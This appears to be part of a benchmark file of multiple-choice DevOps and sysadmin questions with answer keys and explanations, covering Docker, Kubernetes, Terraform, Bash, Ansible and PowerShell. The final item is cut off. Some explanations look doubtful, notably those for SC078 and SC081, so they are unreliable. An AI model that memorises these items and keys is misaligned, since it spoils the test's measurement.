+      "explanation": "A PodDisruptionBudget specifies the minimum number of pods that must remain available (minAvailable) or the maximum number that can be unavailable (maxUnavailable) during voluntary disruptions like kubectl drain or cluster upgrades.",
+      "topic": "pod_spec",
+      "topic_category": "kubernetes",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC048",
+      "question": "What is the purpose of `Jinja2 templates` in Ansible?",
+      "choices": {
+        "A": "They generate dynamic configuration files by combining templates with variables during playbook execution",
+        "B": "They are used exclusively for creating HTML reports of playbook runs",
+        "C": "They define the structure of Ansible inventory files",
+        "D": "They define conditional execution logic that replaces when: clauses"
+      },
+      "answer": "A",
+      "explanation": "Jinja2 templates in Ansible use the 'template' module to render .j2 files with variables, loops, and conditionals, producing configuration files customized per host. Variables are resolved from the Ansible variable hierarchy at runtime.",
+      "topic": "jinja2_templates",
+      "topic_category": "ansible",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC049",
+      "question": "What is the effect of running `chmod 4755 /usr/local/bin/myutil`?",
+      "choices": {
+        "A": "The file is given setgid permissions, running with the group's privileges",
+        "B": "The file is made executable by all users and runs with the file owner's privileges due to the setuid bit",
+        "C": "The file is made read-only and can only be executed by root",
+        "D": "The file gains the sticky bit, preventing deletion by non-owners"
+      },
+      "answer": "B",
+      "explanation": "The leading 4 in 4755 sets the setuid bit. Combined with 755 (rwxr-xr-x), the file is executable by all users but runs with the file owner's effective UID. This is how programs like passwd gain temporary root access.",
+      "topic": "file_permissions",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC050",
+      "question": "In Terraform, what is the purpose of `terraform workspace` commands?",
+      "choices": {
+        "A": "They switch between different Terraform configuration directories",
+        "B": "They manage user permissions for accessing Terraform Cloud",
+        "C": "They configure the local filesystem layout for .tf files",
+        "D": "They manage separate state files within the same configuration, enabling parallel environments like dev/staging/prod"
+      },
+      "answer": "D",
+      "explanation": "Terraform workspaces maintain separate state files for the same configuration, allowing you to manage multiple environments (dev, staging, production) without duplicating code. Each workspace has its own state, and the workspace name is available via terraform.workspace.",
+      "topic": "workspace_management",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC051",
+      "question": "In a GitHub Actions workflow, what does `concurrency` control achieve?\n\n```yaml\nconcurrency:\n  group: deploy-${{ github.ref }}\n  cancel-in-progress: true\n```",
+      "choices": {
+        "A": "It queues all matching workflows and runs them sequentially without cancellation",
+        "B": "It ensures only one workflow run per concurrency group is active; if a new run starts, the in-progress run is cancelled",
+        "C": "It sets the maximum number of concurrent API calls the workflow can make",
+        "D": "It limits the number of parallel jobs within a single workflow run"
+      },
+      "answer": "B",
+      "explanation": "The concurrency group ensures at most one run with the same group key is active. With cancel-in-progress: true, a new run cancels any currently running workflow in the same group, which is useful for deployments where only the latest push matters.",
+      "topic": "workflow_syntax",
+      "topic_category": "cicd",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC052",
+      "question": "What is the purpose of Bash here documents (heredocs)?\n\n```bash\ncat <<'EOF'\n$HOME is not expanded\nEOF\n```",
+      "choices": {
+        "A": "They create a temporary file that persists after script execution",
+        "B": "They define reusable template strings that can be called like functions",
+        "C": "They are comment blocks that document the script for maintainers",
+        "D": "They redirect stdin to read from a multi-line string literal defined inline in the script"
+      },
+      "answer": "D",
+      "explanation": "Heredocs redirect stdin from inline multi-line text. When the delimiter is quoted (<<'EOF'), no variable expansion or command substitution occurs. Without quotes (<<EOF), variables and commands are expanded before passing to the command.",
+      "topic": "here_documents",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC053",
+      "question": "In Docker, what is the advantage of using `COPY --chown=node:node . /app` over `COPY . /app` followed by `RUN chown -R node:node /app`?",
+      "choices": {
+        "A": "There is no advantage; they produce identical layers",
+        "B": "COPY --chown works on Windows containers; RUN chown does not",
+        "C": "COPY --chown is faster because it skips filesystem permission checks",
+        "D": "COPY --chown sets ownership in a single layer, avoiding the extra layer and disk space doubling caused by a separate RUN chown"
+      },
+      "answer": "D",
+      "explanation": "RUN chown after COPY creates a new layer that stores modified copies of all affected files, effectively doubling the space for those files. COPY --chown sets ownership as part of the copy layer itself, avoiding the duplicate data.",
+      "topic": "size_optimization",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC054",
+      "question": "What does the PowerShell cmdlet `Invoke-Command -ComputerName Server01 -ScriptBlock { Get-Process }` do?",
+      "choices": {
+        "A": "Runs Get-Process on the local machine and sends the output to Server01",
+        "B": "Opens an interactive PowerShell session on Server01",
+        "C": "Installs the Get-Process cmdlet on Server01 if not already present",
+        "D": "Executes Get-Process remotely on Server01 via WinRM and returns the deserialized results to the local session"
+      },
+      "answer": "D",
+      "explanation": "Invoke-Command with -ComputerName executes the script block on the remote machine via PowerShell remoting (WinRM by default). Results are serialized, transmitted back, and deserialized as PSObjects on the local machine.",
+      "topic": "remoting",
+      "topic_category": "powershell",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC055",
+      "question": "What is the purpose of Linux cgroups (control groups)?",
+      "choices": {
+        "A": "They define network security groups for controlling traffic between processes",
+        "B": "They group files into logical collections for backup purposes",
+        "C": "They manage user groups and their associated permissions on the filesystem",
+        "D": "They limit, account for, and isolate resource usage (CPU, memory, I/O, network) of process groups"
+      },
+      "answer": "D",
+      "explanation": "Cgroups provide resource limiting (max CPU, memory), prioritization, accounting, and isolation for groups of processes. They are a core building block of containers (Docker, systemd) for enforcing resource boundaries.",
+      "topic": "cgroups",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC056",
+      "question": "In Ansible, what is the purpose of a `role` and what is its standard directory structure?",
+      "choices": {
+        "A": "A role defines a user's access level; its structure includes users/ and permissions/ directories",
+        "B": "A role is a collection of inventory files organized by environment",
+        "C": "A role is a reusable unit of automation with a standard layout: tasks/, handlers/, templates/, files/, vars/, defaults/, and meta/ directories",
+        "D": "A role is a single playbook file that can be imported into other playbooks"
+      },
+      "answer": "C",
+      "explanation": "An Ansible role packages related tasks, handlers, templates, files, variables, and metadata into a standard directory structure for reuse. Roles are included in playbooks via the roles: keyword or include_role/import_role.",
+      "topic": "roles",
+      "topic_category": "ansible",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC057",
+      "question": "What does the following Bash script do?\n\n```bash\ndeclare -A colors\ncolors[red]=\"#FF0000\"\ncolors[green]=\"#00FF00\"\nfor key in \"${!colors[@]}\"; do\n  echo \"$key: ${colors[$key]}\"\ndone\n```",
+      "choices": {
+        "A": "It creates and iterates an indexed array, printing index-value pairs",
+        "B": "It creates and iterates an associative array, printing each key-value pair",
+        "C": "It fails because Bash does not support associative arrays",
+        "D": "It prints only the values because ${!colors[@]} returns values, not keys"
+      },
+      "answer": "B",
+      "explanation": "declare -A creates an associative array (hash map). ${!colors[@]} expands to all keys of the array. The loop iterates over keys, and ${colors[$key]} retrieves the corresponding value. Output order is not guaranteed.",
+      "topic": "associative_arrays",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC058",
+      "question": "In Kubernetes, what is the difference between a `Deployment` and a `StatefulSet`?",
+      "choices": {
+        "A": "Deployments can only run one replica; StatefulSets support multiple replicas",
+        "B": "StatefulSets are deprecated in favor of Deployments with PersistentVolumeClaims",
+        "C": "Deployments use rolling updates; StatefulSets can only be updated by deleting all pods",
+        "D": "Deployments are for stateless applications with interchangeable pods; StatefulSets provide stable identities, persistent storage, and ordered deployment for stateful applications"
+      },
+      "answer": "D",
+      "explanation": "Deployments manage stateless pods that are interchangeable. StatefulSets provide stable network identities (pod-0, pod-1), persistent per-pod storage via volumeClaimTemplates, and ordered, graceful deployment and scaling for stateful workloads like databases.",
+      "topic": "workload_types",
+      "topic_category": "kubernetes",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC059",
+      "question": "What is the purpose of a Terraform module?",
+      "choices": {
+        "A": "It provides authentication credentials to Terraform providers",
+        "B": "It generates documentation for the Terraform configuration",
+        "C": "It is a container for multiple resources used together, enabling reusable and composable infrastructure components",
+        "D": "It defines a single resource with all its attributes in a standalone file"
+      },
+      "answer": "C",
+      "explanation": "A Terraform module is a set of .tf files in a directory that encapsulates a group of resources into a reusable component. Modules accept input variables, expose outputs, and can be sourced from local paths, registries, or Git repositories.",
+      "topic": "modules",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC060",
+      "question": "What is the purpose of a reverse proxy like nginx in a typical web architecture?",
+      "choices": {
+        "A": "It monitors backend servers and automatically restarts them on failure",
+        "B": "It directly serves static files and database queries to clients",
+        "C": "It replaces the need for DNS by resolving domain names locally",
+        "D": "It sits between clients and backend servers, forwarding requests, handling TLS termination, load balancing, and caching"
+      },
+      "answer": "D",
+      "explanation": "A reverse proxy accepts client requests and forwards them to appropriate backend servers. It commonly handles TLS termination, load balancing across multiple backends, request caching, compression, and provides a single entry point to the infrastructure.",
+      "topic": "reverse_proxy",
+      "topic_category": "networking",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC061",
+      "question": "What does `fail2ban` do and what problem does it solve?",
+      "choices": {
+        "A": "It monitors log files for repeated failed authentication attempts and temporarily bans offending IP addresses via firewall rules",
+        "B": "It forces users to wait progressively longer between login attempts on the same session",
+        "C": "It disables user accounts after a configurable number of failed logins",
+        "D": "It encrypts failed login attempts and stores them in an audit log"
+      },
+      "answer": "A",
+      "explanation": "fail2ban parses log files (SSH, web servers, etc.) for patterns indicating brute-force attacks. When an IP exceeds the threshold of failures within a time window, it creates temporary firewall rules (iptables/nftables) to ban that IP.",
+      "topic": "ssh_hardening",
+      "topic_category": "security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC062",
+      "question": "In a GitHub Actions workflow, what does `needs:` do when specified in a job definition?\n\n```yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps: ...\n  deploy:\n    needs: test\n    runs-on: ubuntu-latest\n    steps: ...\n```",
+      "choices": {
+        "A": "It runs both jobs on the same runner machine",
+        "B": "It merges the test job's steps into the deploy job",
+        "C": "It shares environment variables between the jobs",
+        "D": "It creates a dependency: the deploy job only runs after the test job completes successfully"
+      },
+      "answer": "D",
+      "explanation": "The needs: key creates a job dependency. The deploy job will not start until the test job completes successfully. If the test job fails, the deploy job is skipped (unless explicitly configured with if: always()).",
+      "topic": "pipeline_stages",
+      "topic_category": "cicd",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC063",
+      "question": "What does `getopts` do in a Bash script and how does it differ from `getopt`?",
+      "choices": {
+        "A": "getopt is the Bash builtin; getopts is a legacy external command",
+        "B": "getopts handles long options natively; getopt only handles short options",
+        "C": "getopts is a Bash builtin that parses short options one at a time in a while loop; getopt is an external command that can also handle long options",
+        "D": "They are identical; getopts is an alias for getopt"
+      },
+      "answer": "C",
+      "explanation": "getopts is a POSIX shell builtin that parses short options (-a, -b value) within a while loop using OPTARG and OPTIND. getopt is an external utility (often GNU-enhanced) that supports both short and long options (--verbose) but requires careful quoting.",
+      "topic": "getopts",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC064",
+      "question": "In Docker, what is the difference between `ENTRYPOINT` and `CMD` in a Dockerfile?",
+      "choices": {
+        "A": "ENTRYPOINT defines the main executable that always runs; CMD provides default arguments that can be overridden at runtime",
+        "B": "CMD runs first, then ENTRYPOINT; they are executed in sequence",
+        "C": "They are interchangeable; using both in the same Dockerfile causes an error",
+        "D": "ENTRYPOINT is for development; CMD is for production"
+      },
+      "answer": "A",
+      "explanation": "ENTRYPOINT sets the container's main executable and is harder to override (requires --entrypoint). CMD provides default arguments appended to ENTRYPOINT. Running `docker run image arg1` replaces CMD but keeps ENTRYPOINT.",
+      "topic": "dockerfile_best_practices",
+      "topic_category": "docker",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC065",
+      "question": "In PowerShell, how do you create a custom object with specific properties?",
+      "choices": {
+        "A": "Custom objects are not supported; you must use hashtables exclusively",
+        "B": "Using `New-Object -TypeName Hashtable` with Add-Member calls",
+        "C": "Using `Set-Variable -Name obj -Value @{ Name = 'value' }` which auto-converts to an object",
+        "D": "Using the `[PSCustomObject]@{ Name = 'value'; Size = 42 }` accelerator syntax"
+      },
+      "answer": "D",
+      "explanation": "[PSCustomObject]@{} is the modern, efficient way to create custom objects in PowerShell. It creates a proper PSCustomObject with named properties that work correctly with Format-Table, Export-Csv, and the pipeline, unlike raw hashtables.",
+      "topic": "pscustomobject",
+      "topic_category": "powershell",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC066",
+      "question": "What is the purpose of a Linux namespace and how does it relate to containers?",
+      "choices": {
+        "A": "Namespaces are storage volumes that persist container data",
+        "B": "Namespaces isolate kernel resources (PID, network, mount, user, etc.) so processes see their own view of the system, forming the core isolation mechanism of containers",
+        "C": "Namespaces provide DNS resolution for container networking",
+        "D": "Namespaces define the resource limits (CPU, memory) for a group of processes"
+      },
+      "answer": "B",
+      "explanation": "Linux namespaces provide isolation of kernel resources: PID (process IDs), NET (network stack), MNT (mounts), UTS (hostname), IPC (inter-process communication), USER (UIDs). Containers are built by combining namespaces (isolation) with cgroups (resource limits).",
+      "topic": "namespaces",
+      "topic_category": "linux",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC067",
+      "question": "What does `certbot --nginx -d example.com` do?",
+      "choices": {
+        "A": "It obtains a free Let's Encrypt TLS certificate for example.com and automatically configures nginx to use it",
+        "B": "It validates an existing certificate and prints its expiration date",
+        "C": "It generates a self-signed SSL certificate and configures nginx to use it",
+        "D": "It revokes the current certificate for example.com from the Let's Encrypt CA"
+      },
+      "answer": "A",
+      "explanation": "Certbot with the --nginx plugin automatically obtains a free Let's Encrypt certificate for the specified domain, configures nginx's server block to use the certificate and enable HTTPS, and sets up automatic renewal.",
+      "topic": "ssl_tls_certificates",
+      "topic_category": "networking",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC068",
+      "question": "What is the principle of least privilege and how does it apply to system security?",
+      "choices": {
+        "A": "Privileged operations should be logged but not restricted",
+        "B": "Every process, user, and program should operate with the minimum set of privileges necessary to complete its task",
+        "C": "System administrators should have the fewest accounts to reduce attack surface",
+        "D": "Users should have the maximum privileges needed for any task they might perform in the future"
+      },
+      "answer": "B",
+      "explanation": "The principle of least privilege dictates that entities should only have the permissions absolutely necessary for their function. This limits the blast radius of compromised accounts, reduces accidental damage, and is implemented via restricted users, capabilities, SELinux, and scoped API tokens.",
+      "topic": "least_privilege",
+      "topic_category": "security",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC069",
+      "question": "What does the following Bash construct do?\n\n```bash\nexec 3>&1\nresult=$(command 2>&1 1>&3)\nexec 3>&-\n```",
+      "choices": {
+        "A": "It captures stderr into the variable while sending stdout to the terminal",
+        "B": "It swaps stdout and stderr permanently for the rest of the script",
+        "C": "It captures both stdout and stderr into the variable",
+        "D": "It discards stderr and captures stdout into the variable"
+      },
+      "answer": "A",
+      "explanation": "FD 3 is opened as a copy of stdout (the terminal). Inside the substitution, stderr is redirected to stdout (captured), then the original stdout is redirected to FD 3 (terminal). The net effect captures only stderr into the variable while stdout passes through.",
+      "topic": "file_descriptors",
+      "topic_category": "bash",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC070",
+      "question": "In Terraform, what is the `terraform import` command used for?",
+      "choices": {
+        "A": "Bringing existing infrastructure resources under Terraform management by adding them to the state file",
+        "B": "Importing Terraform modules from a remote registry",
+        "C": "Importing variable values from a .tfvars file",
+        "D": "Converting CloudFormation templates to Terraform configuration"
+      },
+      "answer": "A",
+      "explanation": "terraform import associates an existing real-world resource with a Terraform resource in the state file. After import, Terraform manages the resource going forward. You must also write the corresponding resource block in your .tf configuration.",
+      "topic": "import",
+      "topic_category": "terraform",
+      "difficulty": "advanced",
+      "type": "standard"
+    },
+    {
+      "id": "SC071",
+      "question": "A production Docker container's overlay filesystem is growing rapidly, causing disk pressure on the host. Given this Dockerfile excerpt:\n\n```dockerfile\nFROM node:20-slim\nWORKDIR /app\nCOPY . .\nRUN npm install\nRUN npm run build\nRUN npm prune --production\nCMD [\"node\", \"dist/server.js\"]\n```\n\nAnd `docker system df` shows the container's writable layer is 2.3GB despite the application being only 50MB. The container writes application logs to `/app/logs/` and temporary processing files to `/tmp/processing/`. What is the most comprehensive fix?",
+      "choices": {
+        "A": "Increase the Docker storage driver's size limit to accommodate the growth",
+        "B": "Use a multi-stage build to reduce the image size, plus mount /app/logs and /tmp/processing as volumes so writes go to named volumes instead of the overlay filesystem",
+        "C": "Run `docker system prune` on a cron schedule to clean up the writable layers",
+        "D": "Add `--rm` flag when starting the container to auto-remove it on stop"
+      },
+      "answer": "B",
+      "explanation": "The writable layer grows because logs and temp files are written inside the container filesystem. Mounting these paths as volumes moves writes off the overlay. A multi-stage build reduces the base image size. Together they address both the initial size (3 RUN layers with dev dependencies) and runtime growth (log/temp accumulation).",
+      "topic": "size_optimization",
+      "topic_category": "docker",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC072",
+      "question": "A CI/CD pipeline deploys to production via GitHub Actions. The team notices that occasionally two deployments run simultaneously, causing database migration conflicts. The current workflow:\n\n```yaml\nname: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./migrate.sh\n      - run: ./deploy.sh\n```\n\nWhat combination of changes prevents concurrent deployments while ensuring the latest code always gets deployed?",
+      "choices": {
+        "A": "Add `concurrency: { group: production-deploy, cancel-in-progress: true }` to cancel superseded runs, plus use an `environment: production` with a required reviewer for the deploy job",
+        "B": "Add `timeout-minutes: 5` to prevent long-running deployments from overlapping",
+        "C": "Add a mutex lock file in the repository and check it before deploying",
+        "D": "Change the trigger to `workflow_dispatch` so deployments are manual only"
+      },
+      "answer": "A",
+      "explanation": "The concurrency group ensures only one deploy runs at a time, with cancel-in-progress ensuring the latest push wins. The environment protection rule adds a human approval gate, preventing accidental deployments. Together they solve both the race condition and add deployment governance.",
+      "topic": "deployment_gates",
+      "topic_category": "cicd",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC073",
+      "question": "A Bash script processes a CSV file but breaks on lines containing commas within quoted fields. The current parsing logic:\n\n```bash\nwhile IFS=',' read -r name email role; do\n  echo \"Processing: $name ($email) - $role\"\ndone < users.csv\n```\n\nSample input: `\"Smith, John\",john@example.com,admin`. The script incorrectly splits 'Smith' and 'John' into separate fields. What is the correct approach to fix this in pure Bash?",
+      "choices": {
+        "A": "Replace the IFS-based read with a proper CSV parser: use a regex or character-by-character state machine that tracks whether the current position is inside quotes, or delegate to `csvtool` or `python -c 'import csv'`",
+        "B": "Add `set -f` to disable globbing, which will fix the quoted field parsing",
+        "C": "Change IFS to a tab character since CSV files should use tabs",
+        "D": "Use `awk -F',' '{print $1,$2,$3}'` instead of the while loop"
+      },
+      "answer": "A",
+      "explanation": "IFS-based splitting has no concept of quoted fields. Properly parsing RFC 4180 CSV requires tracking quote state. In pure Bash, this means a state machine. Practically, delegating to csvtool, Python's csv module, or awk with FPAT (gawk) is more reliable and maintainable.",
+      "topic": "ifs_manipulation",
+      "topic_category": "bash",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC074",
+      "question": "A Kubernetes application experiences intermittent 502 errors during rolling deployments. The deployment spec:\n\n```yaml\nspec:\n  replicas: 3\n  strategy:\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    spec:\n      containers:\n      - name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 10\n```\n\nThe application takes 15-20 seconds to initialize and also needs 10 seconds to drain existing connections on shutdown. What changes fix the 502s?",
+      "choices": {
+        "A": "Remove the readiness probe entirely so pods are immediately added to endpoints",
+        "B": "Increase replicas to 10 to ensure enough pods are always available",
+        "C": "Change the strategy to Recreate to avoid running old and new pods simultaneously",
+        "D": "Increase readiness probe initialDelaySeconds to 25, add a preStop lifecycle hook with a sleep of 10-15 seconds to allow connection draining, and reduce periodSeconds to 5 for faster readiness detection"
+      },
+      "answer": "D",
+      "explanation": "The 502s occur because: (1) new pods are marked ready before the app is fully initialized (initialDelaySeconds too low), and (2) old pods are killed before in-flight requests complete (no graceful shutdown). Increasing initialDelaySeconds past the startup time, adding a preStop hook for drain time, and reducing periodSeconds for responsiveness addresses all three root causes.",
+      "topic": "probes",
+      "topic_category": "kubernetes",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC075",
+      "question": "A Terraform configuration manages an AWS RDS instance, and a developer accidentally runs `terraform destroy` on the production workspace. The state is stored remotely in S3 with DynamoDB locking. What combination of safeguards should be implemented to prevent this scenario?\n\n1. Add `lifecycle { prevent_destroy = true }` to the RDS resource\n2. Enable S3 bucket versioning on the state bucket for state recovery\n3. Use separate AWS accounts for production vs. development with different IAM roles\n4. Add a `terraform.tfvars` check in a pre-apply CI step",
+      "choices": {
+        "A": "Only safeguard 3 is needed; account separation prevents all issues",
+        "B": "Only safeguard 1 is sufficient",
+        "C": "Safeguards 1 and 2 together are sufficient",
+        "D": "Safeguards 1, 2, and 3 together provide defense in depth: prevent_destroy blocks the plan, versioned state enables recovery if bypassed, and separate accounts limit blast radius"
+      },
+      "answer": "D",
+      "explanation": "Defense in depth requires multiple layers. prevent_destroy makes Terraform error on destroy plans for critical resources. Versioned state in S3 enables rollback if state is corrupted. Separate accounts ensure a developer's credentials cannot touch production. No single safeguard is sufficient alone.",
+      "topic": "state_management",
+      "topic_category": "terraform",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC076",
+      "question": "A systemd service for a Python application keeps getting OOM-killed despite the server having 16GB of free RAM. Relevant unit file:\n\n```ini\n[Service]\nType=simple\nExecStart=/usr/bin/python3 /opt/app/server.py\nMemoryMax=512M\nMemoryHigh=400M\nRestart=always\n```\n\n`journalctl -u app.service` shows: `Memory cgroup out of memory: Killed process 1234`. The application legitimately needs 2GB during peak processing but only 200MB at idle. What changes fix this while maintaining resource governance?",
+      "choices": {
+        "A": "Change Type to 'forking' which allocates more memory to child processes",
+        "B": "Add MemoryMin=2G to reserve 2GB exclusively for this service",
+        "C": "Increase MemoryMax to 2.5G and MemoryHigh to 2G to accommodate peak usage, then add MemorySwapMax=0 to prevent swap thrashing, and configure a systemd timer to restart the service during off-peak hours to reclaim leaked memory",
+        "D": "Remove MemoryMax and MemoryHigh entirely to allow unlimited memory usage"
+      },
+      "answer": "C",
+      "explanation": "The OOM kills happen because MemoryMax (512M) is far below peak usage (2GB). Setting MemoryMax to 2.5G (with headroom) allows peak operation. MemoryHigh at 2G triggers kernel reclaim pressure before the hard limit. MemorySwapMax=0 prevents swap, and periodic restarts address potential memory leaks in the Python process.",
+      "topic": "systemd_units",
+      "topic_category": "linux",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC077",
+      "question": "A Bash script needs to process files in parallel with a concurrency limit of 4. The current implementation using `&` and `wait` has no concurrency control:\n\n```bash\nfor file in /data/*.csv; do\n  process_file \"$file\" &\ndone\nwait\n```\n\nWith 500 files, this spawns 500 processes simultaneously, overwhelming the server. What is the correct implementation using only Bash builtins (no `xargs`, `parallel`, or `sem`)?",
+      "choices": {
+        "A": "Use a counting semaphore with a named pipe (FIFO) as a token bucket: create a FIFO, pre-fill it with N tokens, and have each worker read a token before starting and write one back after finishing",
+        "B": "Use `ulimit -u 4` to limit the process count for the shell",
+        "C": "Replace the for loop with `find /data -name '*.csv' | head -4 | xargs -I{} process_file {}`",
+        "D": "Add `sleep 0.1` before each background command to stagger launches"
+      },
+      "answer": "A",
+      "explanation": "A FIFO-based semaphore works by creating a named pipe, writing N tokens (e.g., newlines) into it, then having each worker `read` a token (blocking if none available) before starting and `echo` a token back when done. This implements a proper counting semaphore using only Bash builtins and file descriptors.",
+      "topic": "named_pipes",
+      "topic_category": "bash",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC078",
+      "question": "A Docker container running a Node.js app has a health check defined:\n\n```dockerfile\nHEALTHCHECK --interval=30s --timeout=5s --retries=3 --start-period=10s \\\n  CMD curl -f http://localhost:3000/health || exit 1\n```\n\nThe container shows as `unhealthy` in production but the app responds fine when tested manually with `docker exec -it container curl http://localhost:3000/health`. Investigation reveals the base image is `node:20-alpine`. What is the root cause and the fix?",
+      "choices": {
+        "A": "Alpine-based images do not include curl by default. The health check silently fails because curl is not found. Fix: either add `RUN apk add --no-cache curl` or replace curl with a Node.js-based check: `CMD node -e \"require('http').get('http://localhost:3000/health', (r) => process.exit(r.statusCode === 200 ? 0 : 1))\"`",
+        "B": "The --start-period is too short; the app is not ready within 10 seconds",
+        "C": "Docker health checks cannot use `curl -f` because the -f flag is incompatible with Docker's exit code detection",
+        "D": "The health check interval is too short; increase it to 120s"
+      },
+      "answer": "A",
+      "explanation": "Alpine Linux is a minimal distribution that does not include curl. The HEALTHCHECK fails silently because the curl command is not found (exit code 127), marking the container unhealthy. The manual test worked because the exec session may have used a different shell or curl was installed after build. The fix is to either install curl or use Node.js's built-in http module.",
+      "topic": "health_checks",
+      "topic_category": "docker",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC079",
+      "question": "An Ansible playbook deploys a web application. The team reports that `handlers` for restarting nginx sometimes do not fire even though the configuration template was changed. Relevant playbook:\n\n```yaml\ntasks:\n  - name: Deploy nginx config\n    template:\n      src: nginx.conf.j2\n      dest: /etc/nginx/sites-available/app.conf\n    notify: restart nginx\n\n  - name: Run database migration\n    command: python manage.py migrate\n    register: migration_result\n    failed_when: migration_result.rc != 0\n\nhandlers:\n  - name: restart nginx\n    service:\n      name: nginx\n      state: restarted\n```\n\nThe migration sometimes fails. Why does the handler not fire for runs where the template changed but the migration failed?",
+      "choices": {
+        "A": "The template module has a bug that inconsistently detects changes",
+        "B": "Handlers only fire when explicitly called with `meta: flush_handlers`; the `notify` keyword is a no-op",
+        "C": "Handlers are flushed at the end of the play. When the migration task fails, the play aborts before handlers are executed. Fix: add `meta: flush_handlers` before the migration task, or use a block/rescue structure to ensure handlers fire even on failure",
+        "D": "The handler name contains a space which prevents it from matching the notify directive"
+      },
+      "answer": "C",
+      "explanation": "Ansible handlers accumulate during task execution but are only flushed at the end of the play (or when explicitly flushed). When the migration fails, the play terminates before the handler flush point. Adding `meta: flush_handlers` before risky tasks ensures pending handlers execute. Alternatively, wrapping tasks in a block/rescue ensures handlers fire in the rescue section.",
+      "topic": "handlers",
+      "topic_category": "ansible",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC080",
+      "question": "A PowerShell script manages Windows services but fails intermittently with access denied errors:\n\n```powershell\nfunction Restart-AppServices {\n    $services = Get-Service -Name 'MyApp*'\n    foreach ($svc in $services) {\n        Restart-Service -Name $svc.Name\n        Write-Host \"Restarted $($svc.Name)\"\n    }\n}\n```\n\nThe script runs as a scheduled task under a service account. Some services restart fine, others fail. `Get-Service` shows the failing services have `StartType: Automatic (Delayed Start)`. What is the issue and the fix?",
+      "choices": {
+        "A": "The `-Name` parameter does not accept pipeline objects; use `-InputObject` instead",
+        "B": "Delayed start services cannot be restarted programmatically",
+        "C": "Windows prevents restarting services from scheduled tasks; use Task Scheduler's built-in service restart action instead",
+        "D": "The service account lacks the specific service control permissions. Fix: grant the account 'Service Control' rights via `sc.exe sdset` for each service, add proper error handling with try/catch, and use `-Force` parameter to handle dependent services"
+      },
+      "answer": "D",
+      "explanation": "Windows service permissions are per-service ACLs. The service account may have control rights on some services but not others. The delayed start type is a red herring. The fix requires: (1) granting SC_MANAGER_CONNECT and SERVICE_START/STOP to the account via sc.exe sdset, (2) adding try/catch for graceful error handling, (3) using -Force to handle dependency chains.",
+      "topic": "modules",
+      "topic_category": "powershell",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC081",
+      "question": "A Bash script uses signal handling but exhibits a race condition:\n\n```bash\n#!/bin/bash\ncleanup_done=false\ncleanup() {\n    if [ \"$cleanup_done\" = false ]; then\n        cleanup_done=true\n        echo \"Cleaning up PID $$\"\n        rm -rf /tmp/workdir.$$\n        kill -- -$$ 2>/dev/null\n    fi\n}\ntrap cleanup EXIT SIGTERM SIGINT\n\nmkdir -p /tmp/workdir.$$\n# Long-running work with background processes\nsome_command &\nwait $!\n```\n\nThe issue: when SIGTERM arrives during `some_command`, the cleanup runs but then the EXIT trap fires cleanup a second time. Despite the guard variable, `/tmp/workdir.$$` is occasionally not cleaned up. What is the root cause and fix?",
+      "choices": {
+        "A": "The issue is that `wait $!` does not return when SIGTERM is received; the cleanup never actually executes",
+        "B": "The guard variable approach is correct but the rm command is wrong; use `rm -rf /tmp/workdir.$$/*` instead",
+        "C": "The race condition is between the background process and the trap; adding `set -m` for job control fixes it",
+        "D": "When a signal trap handler runs and then re-raises the signal via `kill -- -$$`, the shell exits, triggering the EXIT trap again in a new context where cleanup_done is reset. Fix: reset the trap to default in the handler before re-raising: `trap - SIGTERM; kill -TERM $$`"
